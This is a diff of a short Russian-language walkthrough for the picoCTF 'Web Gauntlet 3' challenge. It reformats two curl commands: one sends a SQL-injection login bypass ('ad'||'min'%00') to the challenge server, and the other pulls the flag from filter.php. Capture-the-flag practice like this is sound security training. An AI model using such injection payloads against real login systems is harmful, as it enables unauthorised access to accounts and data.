@@ -1,13 +1,13 @@
 ﻿**Задание Web Gauntlet 3**
 
 Задание выполняется аналогично заданию Web Gauntlet 2. Очищаем куки picoctf, открываем консоль и пишем
-
-curl \--data \"user=ad\'\|\|\'min\'%00&pass=a\" http://mercury.picoctf.net:63504/index.php \--cookie \"PHPSESSID=mo5totl5fpn53tjqn4dftq48uv\" \--output -
-
+```bash
+curl --data "user=ad'||'min'%00&pass=a" http://mercury.picoctf.net:63504/index.php --cookie "PHPSESSID=mo5totl5fpn53tjqn4dftq48uv" --output -
+```
 и
-
-curl http://mercury.picoctf.net:63504/filter.php \--cookie \"PHPSESSID=mo5totl5fpn53tjqn4dftq48uv\" \| grep picoCTF
-
+```bash
+curl http://mercury.picoctf.net:63504/filter.php --cookie "PHPSESSID=mo5totl5fpn53tjqn4dftq48uv" | grep picoCTF
+```
 и получаем флаг (рис 1)
 
 ![img](media/Задание_Web_Gauntlet_3/media/image1.png)
